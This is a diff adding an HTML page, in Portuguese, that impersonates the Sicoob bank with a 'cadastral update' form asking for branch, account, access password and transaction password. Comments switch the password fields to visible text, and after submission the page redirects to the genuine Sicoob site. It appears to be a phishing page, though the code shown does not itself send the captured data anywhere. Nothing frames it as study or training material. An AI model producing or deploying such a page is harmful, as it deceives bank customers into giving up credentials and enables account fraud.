@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sicoob - Atualização Cadastral</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #006747; /* Fundo verde do Sicoob */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            color: #333;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header img {
+            width: 120px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #006747;
+            font-size: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .input-group input:focus {
+            border-color: #006747;
+            outline: none;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 10px;
+            background-color: #006747;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .btn-submit:hover {
+            background-color: #004b32;
+        }
+
+        .error {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://logovtor.com/wp-content/uploads/2020/04/sicoob-vector-logo.png" alt="Logo Sicoob"> <!-- Logo Sicoob -->
+            <h1>Atualização Cadastral</h1>
+        </div>
+        
+        <form id="updateForm">
+            <div class="input-group">
+                <label for="agencia">Agência</label>
+                <input type="text" id="agencia" name="agencia" required>
+                <div id="agenciaError" class="error"></div>
+            </div>
+            
+            <div class="input-group">
+                <label for="conta">Conta</label>
+                <input type="text" id="conta" name="conta" required>
+                <div id="contaError" class="error"></div>
+            </div>
+            
+            <div class="input-group">
+                <label for="senhaAcesso">Senha de Acesso</label>
+                <!-- Altere o tipo de "password" para "text" -->
+                <input type="text" id="senhaAcesso" name="senhaAcesso" required>
+                <div id="senhaAcessoError" class="error"></div>
+            </div>
+            
+            <div class="input-group">
+                <label for="senhaTransacao">Senha de Transação</label>
+                <!-- Altere o tipo de "password" para "text" -->
+                <input type="text" id="senhaTransacao" name="senhaTransacao" required>
+                <div id="senhaTransacaoError" class="error"></div>
+            </div>
+            
+            <button type="submit" class="btn-submit">Atualizar</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("updateForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let isValid = true;
+
+            // Limpar mensagens de erro
+            document.getElementById("agenciaError").textContent = '';
+            document.getElementById("contaError").textContent = '';
+            document.getElementById("senhaAcessoError").textContent = '';
+            document.getElementById("senhaTransacaoError").textContent = '';
+
+            // Validar os campos
+            const agencia = document.getElementById("agencia").value.trim();
+            const conta = document.getElementById("conta").value.trim();
+            const senhaAcesso = document.getElementById("senhaAcesso").value.trim();
+            const senhaTransacao = document.getElementById("senhaTransacao").value.trim();
+
+            if (!agencia) {
+                document.getElementById("agenciaError").textContent = 'Agência é obrigatória.';
+                isValid = false;
+            }
+
+            if (!conta) {
+                document.getElementById("contaError").textContent = 'Conta é obrigatória.';
+                isValid = false;
+            }
+
+            if (!senhaAcesso) {
+                document.getElementById("senhaAcessoError").textContent = 'Senha de acesso é obrigatória.';
+                isValid = false;
+            }
+
+            if (!senhaTransacao) {
+                document.getElementById("senhaTransacaoError").textContent = 'Senha de transação é obrigatória.';
+                isValid = false;
+            }
+
+            if (isValid) {
+                // Redireciona para o site do Sicoob após a validação
+                window.location.href = "https://www.sicoob.com.br";
+            }
+        });
+    </script>
+</body>
+</html>
